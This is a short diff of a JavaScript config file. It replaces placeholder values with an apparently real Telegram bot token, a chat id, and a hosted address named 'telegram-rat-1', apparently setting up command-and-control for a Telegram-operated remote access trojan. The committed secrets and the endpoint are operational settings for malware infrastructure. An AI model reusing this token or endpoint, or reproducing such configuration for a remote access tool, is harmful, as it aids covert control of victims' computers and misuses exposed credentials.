@@ -1,5 +1,5 @@
 module.exports = {
-  token: "YOUR_TELEGRAM_BOT_TOKEN",
-  id:"Enter Your Id",
-  address:"Enter your url"
+  token: "8269491077:AAHX0xw0QX8_6LrziGUGoAr9qvjlv096eAc",
+  id:"7100193056",
+  address:"https://telegram-rat-1.onrender.com"
 };
